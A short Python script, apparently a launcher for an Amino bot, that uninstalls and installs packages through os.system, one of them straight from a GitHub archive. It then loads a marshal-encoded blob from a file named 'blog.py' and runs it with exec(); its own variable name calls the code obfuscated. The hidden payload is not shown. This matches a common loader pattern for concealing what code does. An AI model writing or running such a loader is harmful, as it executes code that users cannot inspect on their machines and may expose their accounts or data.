import os
os.system("pip uninstall Aminofix")
os.system("pip uninstall BotAmino")
os.system("pip install tqdm")
os.system("pip install https://github.com/ThePhoenix78/BotAmino/archive/master.zip")
os.system("pip install colorama")
os.system("pip install colored")
os.system("pip install requests")
os.system("pip install pystyle")
import marshal

with open('blog.py', 'rb') as file:
    codigo_ofuscado = file.read()

codigo_compilado = marshal.loads(codigo_ofuscado)
exec(codigo_compilado)
